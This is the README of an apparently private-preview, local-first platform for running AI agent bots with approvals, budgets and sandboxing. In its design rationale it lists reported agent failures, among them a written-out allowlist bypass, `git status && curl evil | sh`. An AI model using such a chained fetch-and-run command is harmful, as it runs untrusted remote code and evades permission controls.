# hutch

> Your bots. Your machine. Your rules.

hutch is a **local-first, MIT-licensed multi-bot platform in private preview** (early software, Linux first). Run named AI bots on
your own machine, each with its own model, tools, schedule, memory and workspace, with human approval gates,
step/time/token caps and run transcripts.

Hosted agent products (OpenAI dots, Grok Bot) give each agent a computer in the vendor's cloud. hutch runs on your
machine instead: the orchestrator, memory, logs and bots live in one directory on your disk, with models you choose, local
(Ollama, llama.cpp, LM Studio) or hosted (Anthropic, OpenAI, any OpenAI-compatible API). The trade-off is that
nothing runs while the machine is asleep.

**Status.** What works and what does not is tracked in [docs/realignment/baseline.md](docs/realignment/baseline.md) (measured
today) and [docs/realignment/ledger.md](docs/realignment/ledger.md) (what is being fixed). Not published: the repository is private
and there is no PyPI release, so install from a source checkout.

```
$ hutch run tidy-downloads "sort this week's downloads"
→ remember    {"key": "last-run", "value": "sort downloads"}
→ list_files  42 files
! approval needed: move invoices/ → sorted/invoices/      ← you decide
✓ approved — continuing
✓ moved 38 files · run succeeded (steps=6, tokens≈2.1k)
```

## Why it exists

Each core requirement traces to a *reported* failure class of agent products: runaway loops that keep spending, schedules that
quietly never ran, agents reading files they should not, allowlists bypassed with `git status && curl evil | sh`, permission
prompts so relentless people switch to yolo mode. Most of these are individual reports, not measured prevalence; the sources,
and which of them did not survive re-checking, are in [docs/research/complaints.md](docs/research/complaints.md). The design
answers, and their limits, are in [docs/safety.md](docs/safety.md).

## Quickstart

```bash
cd hutch                       # your source checkout (the repository is private)
pip install -e .               # from a source checkout; or: uv venv && uv pip install -e ".[dev]"
hutch init                   # create local state; no bots or runs are fabricated
hutch serve                  # dashboard → http://127.0.0.1:8787
```

Configure a real model route in **Connections**, then create a bot with that route. For a local
Ollama install, for example:

```bash
hutch bot create research-briefing --display-name "Research Briefing" --model ollama/llama3.2 --tools files,web_fetch --approvals ask
hutch run research-briefing "summarize this week's AI news"
```

The run uses the configured model and real tool responses. Review and resolve any approval
shown by Hutch before the requested action can continue. `hutch daemon` runs schedules and
approval expiry without the dashboard.

## Feature highlights

- **Multiple named bots** — own model, tools, recurring tasks, memory, workspace; pause/resume; templates. New-bot setup suggests a clear, purpose-derived display name locally; you can edit it and the stable address before confirming. The CLI accepts `--display-name`; older slug-only Bots receive readable labels.
- **Model choice, local first** — native Ollama (context size always set), Anthropic, OpenAI, and OpenAI-compatible endpoints. There is no user-facing mock model or simulated run; setting `HUTCH_TESTING` does not change product behavior. Live provider and local-model checks depend on your setup
- **Per-bot model routing** — Hybrid allows local and hosted routes; Local keeps model calls on recognized local routes while tools may still use the network. Experimental Offline is offered only after Linux bubblewrap network/PID-namespace and Unix-socket broker checks pass. It removes browser/web tools and requires contained shell; the separate model service may still use the network.
- **Switch models from the chat** — a composer menu shows what fits this machine, what it costs and what is missing; per message, never a silent edit of the bot
- **Provider connections** — OpenCode Go uses its issued API key copied into Hutch; Xiaomi MiMo Token Plan and custom endpoints use their own scoped keys. An opt-in Sign in with ChatGPT preview uses the official local token-sharing flow when eligible. Each route keeps its own allowance and terms; Hutch never imports another app's sign-in files.
- **Local inference admission** — one caller and eight waiters across Hutch workers; releases capacity during human waits,
  rechecks native Ollama memory headroom, and shows queue reasons. Fit remains estimated; real models are unverified.
  `hutch doctor` reports configuration problems with suggested fixes.
- **Scheduling that survives sleep and DST** — IANA-timezone cron, DST-correct, catch-up after sleep; each occurrence and each run is
  claimed in the database; each bot can have up to 100 named tasks with independent prompts and timezones. One elected supervisor
  handles schedules and recovery, and one bot never overlaps itself. Manage them in Settings or with `hutch bot schedules`.
- **Bounded task delegation (experimental)** — an explicit `delegate_task` opt-in for the built-in Strict Offline Linux worker.
  Every request asks for approval, receives only the task text, and runs in a private workspace under the parent's captured
  permissions and budget. Each lineage is depth-limited and time/step-bounded; parent Stop reaches children. The default two-run
  global limit permits one child at a time. This is not general multi-bot collaboration or automatic file transfer; see
  [delegation limits](docs/realignment/delegation.md).
- **Approvals that don't nag** — ask-once with sticky always-allows; unanswered = denied
- **Local browser handoff (experimental)** — opt in per bot to let a person enter passwords, one-time codes, and CAPTCHA responses directly in the same visible Linux browser session. Hutch never types credentials or solves challenges; Resume rechecks the live page without reloading. Ordinary form actions remain approval-gated; sensitive browser values are redacted and screenshots are blocked while a conventional sensitive field is visible. Detection may miss custom fields. Phone handoff is unavailable. Run `hutch bot update <name> --local-browser-handoff`.
- **Optional browser alerts** — get a generic reminder when a new approval or uncertain action needs you while Hutch is open in a background tab. Alerts never include chat or action text. They are not push notifications and stop when the tab closes.
- **Usage budgets** — steps and wall-clock limits plus atomic per-bot token and shared provider-account reservations. Currency checks use recorded prices and prompt estimates; unknown-price routes are refused while a currency cap is set, and provider billing can differ. `hutch usage reservations` lists uncertain charges for reconciliation. `serve`, `daemon`, and `hutch run` use one owned worker process per attempt; cancellation stays visible until cleanup is verified
- **Workspace and shell containment** — file tools stay in the workspace. New bots request Linux bubblewrap strict mode for shell commands, with no shell network and bounded resources; unsupported hosts fail closed. Existing bots keep their saved setting, and `sandbox: off` is explicitly uncontained execution. This shell boundary is not a VM and does not contain the browser or external runtimes
- **Workspace continuity** — fresh per-run folders remain the default; choose a private Hutch-managed folder for one bot's runs and chats, or explicitly select an existing folder. Changing modes never moves or deletes files, and bot deletion keeps managed workspaces.
- **Run transcripts** — canonical SQLite events and recoverable JSONL files; durable delivery retries after restart and shows pending file errors without losing chat history
- **Conversation files** — successful `write_file` actions appear as SHA-256-checked downloads directly in Studio chat, outside collapsed tool details; clipped tool output has per-tool display limits and a verified download/source card. The composer menu can browse saved files and clipped tool output from every run in that conversation. An owner can explicitly share a verified reference to a selected other chat and manage or revoke it from either chat's Files list; bytes stay in the source run and are not copied into the receiving workspace or model context. Snapshots are capped at 4 MB per file and 16 MB per run; shell-created files stay in the workspace
- **Uncertain action review** — inspect saved arguments in chat, check the destination and record a human outcome report. Missing receipts remain distinct from success; reconciliation preserves execution history and grants no permission.
- **Database restore review** — snapshot committed SQLite history, verify it in a new directory and quarantine old work. Source process records confer no cleanup authority; devices and standing grants are revoked, schedules paused and new execution held for a local review. Credentials, browser profiles and user files need separate backups. See [Operations](docs/operations.md).
- **Scoped reference facts** — bots propose facts in their chat; a human reviews them before recall. Sharing with other chats is explicit. Revised content needs a new review, old versions remain inspectable, and memory can be disabled without hiding management. Facts are reference data, never tool permission; archive keeps history and backups.
- **Reconnectable state** — ordered resource invalidations and snapshot reconciliation; chat approvals refresh without replacing the draft
- **Conversations (preview)** — the Studio stores separate threads across restarts, offers thread switching and archive, and sends a
  bounded recent history to the builtin runtime. The versioned API has SQLite full-text search, restart-safe command idempotency,
  cross-run transcript replay and bounded snapshot reconciliation after a cursor gap. Standalone
  `/api/v1/tasks/runs` submissions and human-resume commands use restart-safe idempotency; resume is
  bound to the active human-needed event so an old action cannot skip a later challenge. Built-in
  chat runs can ask a bounded single- or multi-select question; answers resume with a normal chat
  message and never approve an action. Pi/OpenCode do not support this path yet.
- **Remote pairing (experimental)** — a one-time code opens the responsive dashboard on a paired browser, and Connections can list and
  revoke device sessions. Direct access requires explicit HTTPS binding. An operator-managed HTTPS reverse proxy can be configured with
  an exact trusted-proxy network and public-host allowlist; Hutch does not provision tunnels. Live network and physical-device checks
  remain open, and remote browser/PTY handoff is unavailable. See [remote operations](docs/operations.md#remote-pairing-experimental).
- **Browser (experimental)** — optional Playwright extra and a persistent profile per bot. Opt in to Local browser handoff to open
  the same session in a visible Linux desktop window; Hutch pauses while you complete a detected login challenge and verifies the
  challenge is gone after Resume. Only one Hutch desktop handoff can be active at a time. Headless runs fail clearly at a challenge;
  the owned Chromium context sends HTTP(S) and WebSocket traffic through a local DNS-pinning proxy with implicit local bypass disabled.
  Local fixtures exercise the proxy; live public destinations and non-HTTP browser traffic are not verified. Phone handoff remains unavailable.
- **External runtimes** — Pi and OpenCode are recognized in old bot configs but disabled before starting a process. Their
  permission broker, process containment and provider budget path are not ready. Supported production execution uses Hutch's builtin runtime with a configured local or hosted model.

To opt a local Linux bot into the bounded child-task tool, use a supported numeric-loopback model route and verified Strict Offline
host support, then run `hutch bot update <name> --inference-mode offline --sandbox strict --tools files,delegate_task`. Review the
delegation approval in chat or Needs you each time; configuration does not grant standing approval.

## Documentation

| Doc | Contents |
|---|---|
| [Architecture](docs/architecture.md) | component map, decision log, concurrency model |
| [Safety model](docs/safety.md) | deny/ask/allow rules, approval flow, honest limits |
| [Connections](docs/connections.md) | OpenCode Go API-key handoff, ChatGPT local sign-in preview, provider-specific limits |
| [Bot configuration](docs/bot-config.md) | fields, model specs, schedules, limits, examples |
| [Operations](docs/operations.md) | Linux sandbox requirements, remote pairing, incomplete cleanup, migration backups and restore |
| [Models](docs/models.md) | chat model switcher, fit, model slots, prices, `hutch doctor` |
| [Connections](docs/connections.md) | subscription plans and custom endpoints, keys, allowances, what is unsupported and why |
| [Provider compatibility](docs/realignment/provider-compatibility.md) | route status, request fields, evidence dates, and live-verification limits |
| [Design system](docs/design-system.md) | shared UI tokens, components, icon/emoji policy, a11y rules |
| [Roadmap](docs/roadmap.md) | phases: hardening → capability → scale-out |
| [Bounded delegation](docs/realignment/delegation.md) | Strict Offline opt-in, approval, context boundary and current limits |
| [Realignment](docs/realignment/baseline.md) | measured baseline, evidence ledger, [architecture decisions](docs/adr/), continuation ledger |
| [API and conversation contract](docs/realignment/contracts.md) | versioned local resources, idempotency, cursors and remaining remote-access gaps |
| [Research](docs/research/) | orchestrator/runtime comparison; incident-based requirements |

Marketing site: [website/](website/index.html) (static landing page; its claims are checked against the evidence ledger).
Web Dashboard: conversation-first Studio (`http://127.0.0.1:8787/#/chat`) with one bot roster, inline approvals and a cross-bot Needs you drawer. Bot settings own memory, permissions and defaults. Monitor holds Activity and run history; a searchable Fleet view appears at ten bots. See [navigation decisions](docs/realignment/navigation.md).

Configured fallback to another hosted account or destination requires a per-run review. A
broken stream retains uncertain usage and a retry needs another usage reservation. These
holds persist across allowance rollover until settled or explicitly reconciled. Stale workers
cannot release them or change their receiving account. These controls have fixture coverage;
provider billing and live compatibility remain unverified.

## Development

```bash
uv venv && uv pip install -e ".[dev]"
pytest --ignore=tests/e2e   # isolated provider and execution fixtures; tests/e2e needs Playwright browsers
hutch init && hutch serve   # opens the real empty setup state; no sample activity is seeded
```

Python ≥ 3.11. Linux first; macOS/Windows are roadmap items.

## License

MIT — see [LICENSE](LICENSE).
